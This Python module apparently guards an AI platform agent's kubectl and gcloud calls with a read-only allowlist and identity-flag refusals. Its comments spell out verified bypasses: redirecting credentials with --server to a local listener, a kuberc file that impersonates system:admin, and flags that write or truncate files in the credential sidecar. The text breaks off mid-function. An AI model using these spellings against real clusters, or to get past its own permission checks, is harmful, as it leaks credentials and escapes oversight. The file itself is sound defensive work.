#!/usr/bin/env python3
"""Read-only enforcement for the two CLIs that reach customer infrastructure.

The credential proxy already refuses commands that disclose or replace a
credential. It has never refused one that changes a cluster: every rule in
policy.json matches a credential pattern, so `kubectl delete ns prod` reaches
the sidecar and runs. What stopped that until now was the Platform Agent's
persona, which is not a permission boundary.

**Today this module is the only thing enforcing the read-only posture.** There
is no layer underneath it: a normalizer that misreads an argv lets the command
through, and the command runs against the customer's cluster. Every refusal
here should be read with that in mind — a false allow is not a lost redundant
check, it is the whole control.

Kubernetes impersonation is planned, not deployed (see the F10 agent permission
model; it is a later slice). Once it lands the API server will authorize each
request as the requesting *human user* rather than as the agent, and this
module becomes the second of two layers. Until then, do not weaken a rule here
on the theory that something downstream will catch it. Nothing does.

Note also that the current deployment shares one Google service account across
every agent. That is the defect impersonation is meant to fix, not a mitigation
this module can lean on.

An allowlist, which is the opposite of the choice GIT_MUTATING_SUBCOMMANDS
makes in credential_proxy.py. The asymmetry differs. Over-blocking git inside a
lease breaks a skill and someone files a bug; under-blocking kubectl against a
customer's production cluster is the thing this model exists to prevent. So git
keeps its denylist and defaults to permitting, and this defaults to refusing.

`git` and `gh` are out of scope on purpose. Writing to the artifact plane is how
the agent is meant to act -- it opens a pull request and CI applies it -- and
the git workspace lease already governs those verbs.

## Structural limitations

This module cannot cover `CLOUDSDK_AUTH_IMPERSONATE_SERVICE_ACCOUNT` environment
variable or impersonation set in the default gcloud configuration file. Both
arrive without appearing in argv and cannot be detected here. The control is
the credential proxy owning `CLOUDSDK_CONFIG` and the process environment.
This is a gate on argv, not the impersonation boundary.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Decision:
    allowed: bool
    rule_id: str
    message: str
    verb_tuple: tuple[str, ...] | None = None  # Resolved kubectl/gcloud verb path, safe to log
    offending_flag: str | None = None  # Flag name (before =) that triggered refusal, safe to log


_ALLOWED = Decision(allowed=True, rule_id="", message="")

# Only these two reach a cluster or a cloud project. Everything else the proxy
# executes is governed elsewhere.
_GOVERNED_TOOLS = frozenset({"kubectl", "gcloud"})

# Verb sequences that only read. Tuples rather than bare strings so a verb whose
# effect depends on its subcommand can say which subcommand it meant: `rollout
# status` reports on a rollout, `rollout restart` reschedules every pod behind
# a Deployment.
#
# `diff` is absent deliberately. It is non-mutating, but it works by issuing a
# server-side dry-run write, so it needs write RBAC to succeed at all. Allowing
# it under a read-only grant would buy a confusing failure rather than a
# capability.
#
# `config view` is absent deliberately, and this one is a disclosure rather than
# a mutation. `kubectl config view` prints `token: REDACTED`, but
# `kubectl config view --flatten` prints the token itself, and inlines
# `client-key-data` for certificate users -- verified on v1.36.3. The verb is
# the whole subtree here: refusing `config view` outright is self-contained,
# whereas teaching the credential denylist about `--flatten` means editing a
# regex that lives in the Go operator. `current-context` and `get-contexts`
# stay, which is what the agent actually needs.
KUBECTL_READ_VERBS: frozenset[tuple[str, ...]] = frozenset(
    {
        ("api-resources",),
        ("api-versions",),
        ("cluster-info",),
        ("describe",),
        ("events",),
        ("explain",),
        ("get",),
        ("logs",),
        ("top",),
        ("version",),
        ("wait",),
        ("auth", "can-i"),
        ("auth", "whoami"),
        ("config", "current-context"),
        ("config", "get-contexts"),
        ("rollout", "history"),
        ("rollout", "status"),
    }
)

# Two-word forms that are refused even though their first word is allowed on its
# own. A single-word read verb lets any word follow it -- `("cluster-info",)` is
# in KUBECTL_READ_VERBS and `evaluate` falls back to `verb[:1]`, so
# `cluster-info dump` inherits the allowance. It should not:
# `kubectl cluster-info dump --output-directory=DIR` writes a tree of files at
# any path the agent names, inside the credential sidecar.
#
# This is the inverse of how `rollout` is handled. `("rollout",)` is not listed,
# so `rollout status` has to be spelled out and `rollout restart` is refused by
# default. `cluster-info` has to stay allowed on its own, so the exception is
# spelled out instead. Checked before the allowlist in `evaluate`.
KUBECTL_REFUSED_SUBCOMMANDS: frozenset[tuple[str, ...]] = frozenset(
    {
        ("cluster-info", "dump"),
    }
)

# kubectl's global options that consume the following argument. This is
# enumerated exhaustively (via `kubectl options` on v1.36.3) rather than
# enumerating unknowns: the next release adds a new flag, and under an allowlist
# that would cause a silent bypass nobody sees. Under this denylist of
# value-taking flags, an unknown flag that takes a value becomes unreadable --
# someone reports it, and we update this set.
#
# Membership here means "we know this flag's arity", not "this flag is
# permitted". Several of these are refused outright by _KUBECTL_IDENTITY_FLAGS
# and _KUBECTL_FILE_WRITE_FLAGS below, and they stay listed here so that the
# parser still consumes their values correctly -- an argv that is going to be
# refused should still be *read* correctly, so the refusal names the right flag
# and the logs are not misleading. This is the same separation
# _GCLOUD_FLAGS_WITH_VALUE and _GCLOUD_IDENTITY_FLAGS already make.
_KUBECTL_FLAGS_WITH_VALUE = frozenset(
    {
        "-n", "--namespace", "--context", "--cluster", "--kubeconfig",
        "-s", "--server", "--user", "--token", "--request-timeout",
        "--cache-dir", "--certificate-authority", "--client-certificate",
        "--client-key", "--tls-server-name", "--username", "--password",
        "--kuberc", "--profile", "--profile-output", "--log-flush-frequency",
        "-v", "--v", "--vmodule",
    }
)

# kubectl's boolean global flags. An unrecognized flag (whether boolean or
# value-taking) is treated as making the verb unreadable, which refuses the
# command. This is the inverse of the allowlist for verbs: we enumerate what we
# know, and anything else is assumed to be a hostile or novel flag that could
# hide a verb.
_KUBECTL_BOOLEAN_FLAGS = frozenset(
    {
        "-h", "--help",
        "--insecure-skip-tls-verify", "--disable-compression",
        "--match-server-version", "--warnings-as-errors",
    }
)

# Impersonation and identity-changing flags belong to the broker, not the caller.
# An agent that supplies its own principal chooses its own identity, which inverts
# the model, so these are refused before the verb is even read. Checked by exact
# membership on the flag name (before the `=` separator) so both `--flag=value`
# and `--flag value` forms are caught.
#
# kubectl impersonation flags:
_IMPERSONATION_FLAGS = frozenset(
    {"--as", "--as-group", "--as-uid", "--as-user-extra", "--impersonate-service-account"}
)

# gcloud identity-changing flags (in addition to --impersonate-service-account above):
# - --access-token-file: authenticates with the file's contents instead of the
#   active account (agent controls the filesystem, so this is caller-supplied
#   credentials through a different door)
# - --configuration: names a gcloud config file which can carry impersonate settings
# - --account: selects a different already-credentialed principal
# - --credential-file-override, --authorization-token-file, --authority-selector:
#   undocumented flags from calliope/cli.py. credential-file-override takes a
#   service-account key file (refreshable credentials, strictly worse than short-lived
#   tokens). Listed here despite being undocumented so that future arity edits
#   don't accidentally grant them.
_GCLOUD_IDENTITY_FLAGS = frozenset(
    {
        "--access-token-file", "--configuration", "--account",
        "--credential-file-override", "--authorization-token-file", "--authority-selector",
    }
)

# kubectl's equivalents of _GCLOUD_IDENTITY_FLAGS, and the reason this set
# exists at all: for five review rounds gcloud refused caller-supplied identity
# while every kubectl flag that does the same thing sat on the allow side,
# because it was listed for its arity and nothing read that list as a grant.
#
# Two distinct capabilities are refused here, and both are identity in the sense
# that matters -- who we authenticate as, or who receives the credential.
#
# 1. Supplying a principal. --token, --username/--password,
#    --client-certificate/--client-key and --user all authenticate as somebody
#    the broker did not choose. --user names a kubeconfig user entry, which is
#    only as trustworthy as the kubeconfig; the proxy regenerates that file, but
#    the flag should not be the thing that decision rests on.
#
# 2. Redirecting the credential. `kubectl get pods --server=https://127.0.0.1:8443
#    --insecure-skip-tls-verify` was verified on v1.36.3 to hand the bearer token
#    to a listener on that address -- static tokens and exec-plugin credentials
#    alike. The agent container and this sidecar share a network namespace, so
#    the attacker's listener is a localhost port and no egress is involved.
#    Nothing downstream catches this: the request never reaches a Kubernetes API
#    server, so there is no authorizer to fail closed. --certificate-authority
#    and --tls-server-name are here for the same reason -- they are how a
#    redirected --server is made to look legitimate to TLS.
#
# --kuberc is a member so that removing the dedicated check below still leaves
# it refused. See _kubectl_has_kuberc.
#
# Deliberately *not* here:
# - --kubeconfig, because credential_proxy.py reroutes it (see
#   CommandExecutor._reroute_kubeconfig_flags): the path the agent names is
#   replaced with a file the proxy generated, so the flag cannot select an
#   agent-authored document. Refusing it would break the Cluster Agent pin.
# - --context and --cluster, because they select an entry *within* that
#   proxy-generated kubeconfig. Every server URL and user in it was written by
#   `gcloud container clusters get-credentials`, not by the agent. If the
#   rerouting in credential_proxy.py is ever removed, both belong in this set.
_KUBECTL_IDENTITY_FLAGS = frozenset(
    {
        "-s", "--server",
        "--token", "--user", "--username", "--password",
        "--client-certificate", "--client-key",
        "--certificate-authority", "--tls-server-name",
        "--insecure-skip-tls-verify",
        "--kuberc",
    }
)

# kubectl global flags that write to a path the agent chooses. None of them
# change identity; they are refused because this process runs in the credential
# sidecar, with the sidecar's filesystem.
#
# `kubectl get pods --profile=cpu --profile-output=/opt/data/state/kubeconfigs/gke_p_l_c.yaml`
# truncates that file to zero bytes, verified on v1.36.3, and it does so even
# when the command itself fails -- the profile file is created before the API
# call. That path is a proxy-managed kubeconfig, so the primitive is arbitrary
# file truncation inside the trusted container. --cache-dir is milder but the
# same shape: it creates directories and writes discovery and HTTP cache files
# under any path given.
#
# --output-directory is the odd one out: it belongs to `cluster-info dump`
# rather than to kubectl globally, and it is here because it is the only guard
# on that command that does not depend on the verb parse succeeding. Cobra's
# stripFlags finds `dump` whatever sits between the two words, but phase 2 of
# _kubectl_verb_and_flag stops at the first flag it does not know, so
# `kubectl cluster-info --output-directory=/tmp/x dump` reads as the bare,
# allowed `cluster-info` -- and it was verified to write the full dump tree on
# v1.36.3. Making the two-word match skip over intervening flags would reopen
# the hole phase 2 exists to close, so the flag is refused directly instead.
# This check runs before the verb is parsed, so it holds in any argv order.
# `("cluster-info", "dump")` stays in KUBECTL_REFUSED_SUBCOMMANDS as the second
# of the two guards.
#
# Deliberately not added to _KUBECTL_FLAGS_WITH_VALUE: that table is for
# kubectl's *global* flags, and teaching the parser to consume the value of a
# command-specific flag is how an unknown flag gets to swallow a subcommand.
# The refusal above makes its arity moot.
_KUBECTL_FILE_WRITE_FLAGS = frozenset(
    {
        "--profile", "--profile-output", "--cache-dir", "--output-directory",
    }
)

# gcloud's grammar is `gcloud GROUP... VERB [POSITIONAL...]`, so the verb is
# neither first nor last: `gcloud container clusters get-credentials prod` ends
# in a cluster name. Finding it by position would mean encoding gcloud's whole
# command tree, so the allowed paths are listed instead and everything else is
# refused. The list is meant to grow, and growing it should be a reviewable act
# rather than a regex someone widens in a hurry.
GCLOUD_READ_COMMANDS: frozenset[tuple[str, ...]] = frozenset(
    {
        # Image metadata read; gke-app-onboarding reads a digest with it
        # before proposing a manifest. `images delete` shares three of the
        # four words and stays refused -- the tests hold the door.
        ("artifacts", "docker", "images", "describe"),
        ("auth", "list"),
        ("config", "get"),
        ("config", "get-value"),
        ("config", "list"),
        # `beta` is a word like any other here, so a beta path has to be
        # listed on its own -- the GA entry above it grants nothing. These
        # are the stockout SOP's capacity forecast; the data has no GA
        # spelling yet.
        ("beta", "compute", "advice", "calendar-mode"),
        ("beta", "compute", "advice", "capacity"),
        ("beta", "compute", "advice", "capacity-history"),
        # Budget reads for the cost skills. list only: budgets are written
        # by humans, and `billing accounts list` is deliberately absent --
        # the skills take the account id from configuration, not discovery.
        ("billing", "budgets", "list"),
        ("compute", "addresses", "describe"),
        ("compute", "addresses", "list"),
        ("compute", "backend-services", "list"),
        ("compute", "disks", "describe"),
        ("compute", "disks", "list"),
        # Not spelled by any SOP. A live install refused both under
        # gcp.read-only while the model investigated the fabric (#1126); they
        # are the read side of the firewall rules the networking SOP's Red
        # Lines forbid modifying, and list/describe is all that is granted.
        ("compute", "firewall-rules", "describe"),
        ("compute", "firewall-rules", "list"),
        ("compute", "forwarding-rules", "describe"),
        ("compute", "forwarding-rules", "list"),
        # The daily `gcp-networking-fabric-audit` cron executes
        # governance/gcp_networking_fabric_sop.md exactly, and the networks,
        # routers and security-policies entries were derived from the command
        # spellings that SOP carries. A SOP spelling assumes its arguments are
        # already bound, so a leaf read listed on its own can be unreachable:
        # `routers get-nat-mapping-info $ROUTER` was listed while `routers
        # list`, the only way to bind $ROUTER, was not, and the audit's one
        # critical NAT check never ran (#1126). Grant a discovery read
        # alongside every leaf read that needs one; `networks describe` and
        # `routers describe` are the detail reads behind the two lists.
        # `compute project-info describe` is the stockout SOP's quota
        # remediation read. The writes one word away (networks create,
        # routers create, firewall-rules create, security-policies create,
        # project-info add-metadata) stay refused, and the tests assert it.
        ("compute", "networks", "describe"),
        ("compute", "networks", "list"),
        ("compute", "networks", "subnets", "describe"),
        ("compute", "networks", "subnets", "list"),
        ("compute", "networks", "subnets", "list-usable"),
        ("compute", "project-info", "describe"),
        ("compute", "routers", "describe"),
        ("compute", "routers", "get-nat-mapping-info"),
        ("compute", "routers", "list"),
        ("compute", "security-policies", "list"),
        # The daily `stockout-prevention` cron reads these three and nothing
        # else can stand in for them: reservations list is the committed
        # capacity, regions describe is the quota headroom, machine-types
        # list is what the region can actually place. Missing, the job runs,
        # reports, and silently skips most of its twelve checks -- a clean
        # capacity report the agent never gathered is worse than a failed one.
        ("compute", "machine-types", "list"),
        ("compute", "regions", "describe"),
        ("compute", "regions", "list"),
        ("compute", "reservations", "list"),
        ("compute", "snapshots", "describe"),
        ("compute", "snapshots", "list"),
        ("compute", "target-pools", "list"),
        ("container", "ai", "profiles", "list"),
        # A `create` verb on the read list, so it needs its argument. It
        # renders Kubernetes YAML and mutates nothing in the cloud -- gcloud's
        # own help calls it "generate ready-to-deploy Kubernetes manifests" --
        # and it is the documented next step after `profiles list` in four
        # shipped skills (gke-inference, gke-manifest-generation,
        # gke-cluster-creation, gke-basics' cli-reference), with no MCP
        # equivalent to fall back to. Refusing it let a skill discover a
        # profile and then not generate the manifest it exists to produce.
        # What is NOT granted is its file write: --output-path is refused
        # below, so the manifest comes back on stdout.
        ("container", "ai", "profiles", "manifests", "create"),
        ("container", "ai", "profiles", "models", "list"),
        ("container", "clusters", "describe"),
        ("container", "clusters", "list"),
        # Writes a kubeconfig in the sidecar and nothing in the cloud. It is
        # also how a Cluster Agent points itself at its target cluster, so
        # refusing it would break the read path this module is protecting.
        ("container", "clusters", "get-credentials"),
        ("container", "get-server-config"),
        ("container", "node-pools", "describe"),
        ("container", "node-pools", "list"),
        ("container", "operations", "list"),
        ("info",),
        ("logging", "read"),
        ("projects", "describe"),
        ("projects", "get-iam-policy"),
        ("projects", "list"),
        ("version",),
    }
)

# Derived, not hand-written: a new entry longer than every current one must
# extend the prefix scan in _gcloud_is_read_only, and a constant maintained by
# hand would silently make that entry unreachable.
_LONGEST_GCLOUD_COMMAND = max(len(command) for command in GCLOUD_READ_COMMANDS)

# gcloud flags that consume the following argument. Without these,
# `gcloud --project my-proj container clusters list` reads `my-proj` as the
# first word of the command path and matches nothing. This is enumerated from
# gcloud help, so new flags in future releases that take values will not be
# recognized and will cause a refusal (fail-closed). An unknown flag means the
# command is unreadable and is refused.
_GCLOUD_FLAGS_WITH_VALUE = frozenset(
    {
        "--project", "--format", "--filter", "--region", "--zone",
        "--location", "--account", "--configuration", "--verbosity",
        "--billing-project", "--sort-by", "--limit", "--trace-token",
        "--flatten", "--access-token-file", "-z", "--page-size", "--freshness",
        "--cluster", "--model",
        # `logging read` selectors. The command was allowlisted without them,
        # which refused every spelling the repo actually ships: both
        # log-autoscaler-events.sh scripts pass `--order=asc`, and the two
        # gke-workload-troubleshooting skills pass `--start-time`/`--end-time`.
        # Those scripts also discard stderr and treat empty output as "no
        # events yet", so the refusal was silent — the poll loop slept forever.
        "--order", "--start-time", "--end-time",
        # The spellings the stockout SOP actually passes to the two entries
        # added for it: capacity-history carries the first three, and
        # machine-types list uses --zones (plural; --zone alone was listed).
        # An allowlist entry whose flags are not here is unreachable.
        "--instance-selection-machine-types", "--size", "--types", "--zones",
        "--machine-type", "--provisioning-model", "--target-distribution-shape",
        "--instance-selection",
        # `compute routers list` scopes by --regions (plural), the router
        # analogue of the --zones trap above.
        "--regions",
        # `billing budgets list` requires it.
        "--billing-account",
        # `container ai profiles manifests create` selectors, from its gcloud
        # synopsis. --output-path is deliberately absent from this set and
        # refused outright below; the rest only shape the rendered YAML.
        "--model-server", "--model-server-version", "--model-bucket-uri",
        "--accelerator-type", "--serving-stack", "--serving-stack-version",
        "--target-itl-milliseconds", "--target-ntpot-milliseconds",
        "--target-ttft-milliseconds", "--use-case", "--namespace", "--output",
    }
)

# gcloud flags that write a file wherever the caller points them. The command
# runs in the sidecar, so the file lands in the container holding the
# credentials rather than in the agent's workspace, and an agent that can
# choose the path can overwrite gcloud's own configuration -- the identity
# material --account and --configuration are refused for naming. The shared
# workspace is already writable by the agent directly, so refusing this costs
# a caller nothing it cannot get by redirecting stdout in its own shell. This
# is the gcloud half of the rule _KUBECTL_FILE_WRITE_FLAGS states for kubectl.
_GCLOUD_FILE_WRITE_FLAGS = frozenset({"--output-path", "--log-http-log-file"})

# gcloud boolean global flags that do not consume the following argument.
# These are enumerated from gcloud help and are boolean **at the global parser
# level only**. -v and --version are value-taking in some subcommands like
# `gcloud app` or `gcloud firebase test`, so if those trees are ever added to
# the allowlist, the boolean assumption reopens the hole. An unknown flag is
# still rejected as unreadable, but known boolean flags do not hide the
# command path.
_GCLOUD_BOOLEAN_FLAGS = frozenset(
    {
        "--quiet", "-q", "--version", "-v", "--help", "-h",
        # get-credentials endpoint selectors. Both are boolean, and both are
        # missing here until something refuses a cluster nobody could reach
        # any other way: an unlisted flag makes the whole command unreadable,
        # so `get-credentials --dns-endpoint` is refused as gcp.unreadable-
        # command before the allowlist entry for it is ever consulted. DNS
        # endpoints are how the shipped gke-networking skill reaches a
        # control plane without a public IP, which is exactly the cluster
        # where there is no fallback spelling.
        "--dns-endpoint", "--internal-ip",
        # The one spelling gke-app-onboarding ships for `artifacts docker
        # images describe`; without it the entry granting that read was
        # unreachable.
        "--show-package-vulnerability",
    }
)


def _gcloud_has_flags_file(argv: list[str]) -> str | None:
    """Return '--flags-file' if found in argv, or None otherwise.

    --flags-file reads flags from a YAML file, so flags in that file (like
    --impersonate-service-account) never appear in argv and cannot be checked
    by _refuses_impersonation. The file itself is under the agent's control,
    so we cannot safely scan it: the agent could rewrite it between our check
    and gcloud's read, a race we cannot win. Refusing it outright is the only
    safe option.

    This is *not* the mechanism credential_proxy.py uses for `--kubeconfig`.
    That flag is rerouted, not refused: the proxy reads one string out of the
    named file and regenerates the document, so the agent keeps the ability to
    name a cluster while the content it authored is never opened. Rerouting
    works there because a kubeconfig has exactly one field the proxy needs and
    can rebuild the rest from the GKE API. A flags file has no such shape --
    there is nothing to regenerate it from -- so refusal is all that is left.

    An earlier version of this comment described the two as one mechanism, and
    that conflation is how `--kuberc` was missed for five review rounds: it is a
    flags file wearing kubectl's clothes, and "we handle config files by
    rerouting them" made it look already covered. See _kubectl_has_kuberc.
    """
    for token in argv[1:]:
        name, _, _ = token.partition("=")
        if name == "--flags-file":
            return "--flags-file"
    return None


def _gcloud_writes_a_file(argv: list[str]) -> str | None:
    """Return the file-writing flag found in ``argv``, or None.

    Checked before the command path is read, like the --flags-file and identity
    rules above it: the flag is refused wherever it appears and whatever the
    command turns out to be, so a new allowlist entry cannot quietly bring a
    file write along with it.
    """
    for token in argv[1:]:
        name, _, _ = token.partition("=")
        if name in _GCLOUD_FILE_WRITE_FLAGS:
            return name
    return None


def _gcloud_words_and_flag(argv: list[str]) -> tuple[list[str] | None, str | None]:
    """The bare words of a gcloud argv, and the offending unknown flag if any.

    Returns (words, None) on success, or (None, flag_name) if the command is
    unreadable due to an unknown flag. A flag we do not recognize could have
    arbitrary arity; claim the command is unreadable, fail-closed.
    """
    words: list[str] = []
    index = 1
    while index < len(argv):
        token = argv[index]
        if token.startswith("-"):
            name, separator, _ = token.partition("=")
            # Check if it's a known boolean flag (doesn't consume next token).
            if name in _GCLOUD_BOOLEAN_FLAGS:
                index += 1
                continue
            # Check if it's a known flag that consumes a value.
            if name in _GCLOUD_FLAGS_WITH_VALUE:
                # If it has =, the value is in this token. If not, skip next token.
                if not separator:
                    index += 1
                index += 1
                continue
            # Unknown flags are rejected so that a new gcloud release with a
            # flag we don't know the arity of does not silently bypass this
            # gate. The flag could take a value and hide the command path.
            return None, name
        words.append(token)
        index += 1
    return words, None


def _gcloud_is_read_only(words: list[str]) -> bool:
    """Is the command a listed read-only gcloud command?

    Args:
        words: The words from _gcloud_words_and_flag(). The caller ensures this
            is not None.

    The command path must match exactly a tuple in GCLOUD_READ_COMMANDS.
    Positional arguments after the verb are allowed: `container clusters
    get-credentials my-cluster` matches the path `(container, clusters,
    get-credentials)` and ignores the cluster name.
    """
    # A prefix of the words must exactly match a listed command. This allows
    # positional arguments after the command: get-credentials my-cluster matches
    # (container, clusters, get-credentials).
    #
    # The scan stops at the longest listed command rather than at len(words).
    # Every longer prefix is a tuple no entry can equal, and building and
    # hashing it made a refusal cost O(n^2) in the number of argv words. Nothing
    # upstream bounds that count -- credential_proxy caps the request body, not
    # the list length, and a 1 MiB body holds ~260k words -- so a single
    # unmatched command could hold the sidecar's CPU for minutes. The proxy
    # process also carries the Chat relay and the Slack socket client, and
    # policy evaluation has no timeout around it (timeout_seconds bounds the
    # subprocess, which a refusal never reaches).
    longest = min(len(words), _LONGEST_GCLOUD_COMMAND)
    return any(tuple(words[:length]) in GCLOUD_READ_COMMANDS
               for length in range(1, longest + 1))


def _kubectl_verb_and_flag(argv: list[str]) -> tuple[tuple[str, ...] | None, str | None]:
    """The kubectl verb sequence, and the offending unknown flag if any.

    Returns (verb, None) on success, or (None, flag_name) if the verb cannot be
    read due to an unknown flag. None is a refusal rather than a shrug: an argv
    whose verb cannot be found is an argv whose effect is unknown, and we deny it.

    This function applies the strict unknown-flag rule only to global flags
    (which come before the verb). Command-specific flags (which come after)
    cannot hide the verb, so we stop at the first one rather than skipping
    over it. This avoids false refusals for common commands like `kubectl logs -f`.
    """
    # Phase 1: Skip global flags until we find the first bare word (the verb).
    # Unknown flags are rejected; they could hide the verb.
    index = 1
    while index < len(argv):
        token = argv[index]
        if token.startswith("-"):
            name, separator, _ = token.partition("=")
            # Unknown flags are rejected so that a new kubectl release doesn't
            # silently bypass this gate. A flag we don't recognize could be
            # anything; claim the verb is unreadable.
            if name not in _KUBECTL_FLAGS_WITH_VALUE and name not in _KUBECTL_BOOLEAN_FLAGS:
                return None, name
            if name in _KUBECTL_FLAGS_WITH_VALUE and not separator:
                index += 1
            index += 1
            continue
        # Found the first bare word (the verb).
        word1 = token
        index += 1
        break
    else:
        # Reached end of argv without finding a bare word.
        return None, None

    # Phase 2: Look for a second bare word. Skip flags of known arity (we can
    # correctly consume their values), but stop dead on anything unrecognized.
    # This allows `kubectl rollout -n prod status x` to work (known flag, safe
    # to skip) while refusing `kubectl rollout --unknown status x` (could hide
    # the subcommand). An unknown command-specific flag that takes a value could
    # otherwise make `rollout --someflag status restart x` read as
    # `("rollout","status")` and allow a restart.
    while index < len(argv):
        token = argv[index]
        if token.startswith("-"):
            name, separator, _ = token.partition("=")
            # Stop on unknown flags (arity unknown, could hide the subcommand).
            if name not in _KUBECTL_FLAGS_WITH_VALUE and name not in _KUBECTL_BOOLEAN_FLAGS:
                break
            # Skip known flags, consuming their value if needed.
            if name in _KUBECTL_FLAGS_WITH_VALUE and not separator:
                index += 1
            index += 1
            continue
        # Found a bare word (the subcommand).
        word2 = token
        return (word1, word2), None

    return (word1,), None


def _refuses_impersonation(argv: list[str]) -> str | None:
    """Return the offending impersonation flag name, or None if no impersonation found."""
    for token in argv[1:]:
        name, _, _ = token.partition("=")
        if name in _IMPERSONATION_FLAGS:
            return name
    return None


def _kubectl_has_kuberc(argv: list[str]) -> str | None:
    """Return '--kuberc' if found in argv, or None otherwise.

    kubectl's answer to `gcloud --flags-file`, and it launders the impersonation
    refusal above. A kuberc file carries per-command default options, and that
    feature is on by default in v1.36.3 (it takes KUBECTL_KUBERC=false or the
    KUBERC=off feature gate to disable, neither of which this module can rely
    on). A file the agent controls holding:

        apiVersion: kubectl.config.k8s.io/v1beta1
        kind: Preference
        defaults:
        - command: get
          options: [{name: as, default: system:admin}]

    makes `kubectl --kuberc /agent/writable/kr.yaml get pods` send
    `Impersonate-User: system:admin` -- verified on v1.36.3. The `--as` never
    appears in argv, so _refuses_impersonation cannot see it.

    Reading the file and scanning it for `as` is not an option. The file lives
    on the shared workspace volume and the agent can rewrite it between our
    read and kubectl's, a race we cannot win and should not try to. The only
    safe answer is to refuse the flag outright, which is what gcloud's
    --flags-file already does.

    This covers the flag and only the flag. kubectl also reads
    `$HOME/.kube/kuberc` with no flag present at all -- verified on v1.36.3, a
    default-path kuberc set `Impersonate-User` on a command whose argv this
    function sees nothing wrong with. Nothing in argv can express that, so it
    cannot be closed here. It is closed twice over in credential_proxy.py: the
    subprocess `HOME` is the sidecar-only state dir rather than the shared PVC,
    so the agent cannot write the default path, and `KUBECTL_KUBERC=false` is
    set in `CommandExecutor.environment` so the feature is off regardless of
    what appears there. The second of those exists because the first is
    deployment geometry, and geometry changes without anyone thinking to
    re-check this file.
    """
    for token in argv[1:]:
        name, _, _ = token.partition("=")
        if name == "--kuberc":
            return "--kuberc"
    return None


# Boolean shorthands kubectl registers on the verbs the skills use: -A
# (--all-namespaces), -R (--recursive), -w (--watch) on `get`; -f (--follow),
# -p (--previous) on `logs`; -i/-t (--stdin/--tty) on `exec` and `run`; -q and
# -h. Only these continue a shorthand-cluster walk -- see the note in
# _kubectl_refuses_identity_change for why an unknown letter has to end it
# rather than be assumed boolean.
_KUBECTL_BOOLEAN_SHORTHANDS = frozenset("ARwfpitqh")


def _kubectl_refuses_identity_change(argv: list[str]) -> str | None:
    """Return the offending identity or credential-redirection flag, or None.

    The kubectl counterpart of _gcloud_refuses_identity_change. Checked by exact
    membership on the flag name (before the `=` separator), so both `--flag
    value` and `--flag=value` are caught, and checked over the whole argv rather
    than only the leading global flags -- kubectl accepts these anywhere.

    Exact membership is not sufficient on its own, because pflag also accepts a
    shorthand with its value attached: `-shttp://host` is `--server http://host`
    with no separator to partition on, so the token's "name" is the whole
    `-shttp://host` and it matches nothing. `kubectl get pods -shttps://…` was
    honoured by v1.36.3 and delivered the bearer token to that address, which is
    the credential-exfiltration Critical again through a different spelling.

    `-s` is the only shorthand among the refused flags, but it is a class rather
    than one instance, because pflag lets shorthands cluster. The earlier
    reasoning here -- "pflag only groups shorthands that take no value, and
    `--server` does take one" -- had the rule backwards. parseSingleShortArg
    walks a cluster character by character: every shorthand carrying a
    NoOptDefVal (each boolean) consumes nothing and the walk continues, and the
    *first value-taking* shorthand swallows the rest of the token, or the next
    argv element when nothing is left. A run of booleans ending in `s` is
    therefore `--server`, and cobra merges the root command's persistent
    `-s, --server` into every subcommand's flag set.

    Measured against the shipped flags: `kubectl get` registers the booleans
    `-A`, `-R` and `-w`, and `kubectl logs` registers `-f` and `-p`, so
    `kubectl get pods -As http://host`, `-Rs …` and `kubectl logs x -fs …` all
    reached the server flag while `-s` and `-sVALUE` were refused. The cluster
    is expanded below rather than matched by a wider prefix test, because
    stripping dashes and looking for an `s` would refuse `--sort-by`,
    `--since` and `--selector`, none of which are identity flags.

    The flag name is returned rather than the token, so the address the agent
    chose never reaches a log line.
    """
    for token in argv[1:]:
        name, _, _ = token.partition("=")
        if name in _KUBECTL_IDENTITY_FLAGS:
            return name
        # Attached shorthand: `-sVALUE`. A bare `-s` and `-s=VALUE` both
        # partition to `-s` and are caught by the exact match above, so the only
        # token this adds is the attached form.
        #
        # No `not token.startswith("--")` guard: a token cannot begin with both
        # `-s` and `--`, so such a clause would never evaluate false and would
        # imply long flags are handled here when they are handled by the exact
        # match. `--sort-by`, `--since` and `--selector` are unaffected for that
        # reason, which is worth knowing because the obvious looser spelling of
        # this rule -- stripping dashes before testing for `s` -- would refuse
        # all three.
        #
        if token.startswith("-s") and token != "-s":
            return "-s"
        # Shorthand cluster: `-As http://host`. Only single-dash tokens cluster,
        # and `-s...` is handled above, so what reaches here starts with some
        # other letter.
        #
        # The walk has to stop at the first value-taking shorthand, because
        # everything after it is that flag's value rather than more flags. An
        # earlier revision of this clause tested `"s" in token[1:]` instead and
        # refused `kubectl get pods -ojson` -- `-o` takes a value, `json`
        # contains an `s`, and the read the skills issue constantly came back
        # as an identity-change refusal. `-owide` passed, which is what made it
        # look fine. Substring is not the rule; the walk is.
        #
        # Only characters known to be boolean continue the walk, so an unknown
        # or value-taking shorthand ends it and the rest is treated as a value.
        # That errs toward permitting an odd cluster rather than refusing a
        # read, which is the right direction here: the exfiltration this guards
        # needs `s` to be *parsed* as --server, and it can only be parsed that
        # way when every character before it is a boolean.
        if len(token) > 2 and token.startswith("-") and not token.startswith("--"):
            for character in token[1:]:
                if character == "s":
                    return "-s"
                if character not in _KUBECTL_BOOLEAN_SHORTHANDS:
                    break
    return None


def _kubectl_refuses_file_write(argv: list[str]) -> str | None:
    """Return the offending sidecar-filesystem-writing flag, or None."""
    for token in argv[1:]:
        name, _, _ = token.partition("=")
        if name in _KUBECTL_FILE_WRITE_FLAGS:
            return name
    return None


def _gcloud_refuses_identity_change(argv: list[str]) -> str | None:
    """Return the offending identity-changing flag name, or None if none found.

    --access-token-file, --configuration, and --account all change the
    identity that gcloud uses, which inverts the model. Checked by exact
    membership on the flag name (before the `=` separator).
    """
    for token in argv[1:]:
        name, _, _ = token.partition("=")
        if name in _GCLOUD_IDENTITY_FLAGS:
            return name
    return None


def evaluate(argv: list[str]) -> Decision:
    """Allow or refuse a command on read-only grounds.

    Never raises. Anything unrecognised is refused.
    """
    if not argv or argv[0] not in _GOVERNED_TOOLS:
        return _ALLOWED

    impersonation_flag = _refuses_impersonation(argv)
    if impersonation_flag:
        return Decision(
            allowed=False,
            rule_id="identity.caller-supplied-impersonation",
            message=(
                "Impersonation is set by the credential proxy, not by the "
                "caller. Remove --as/--as-group/--impersonate-service-account."
            ),
            offending_flag=impersonation_flag,
        )

    if argv[0] == "kubectl":
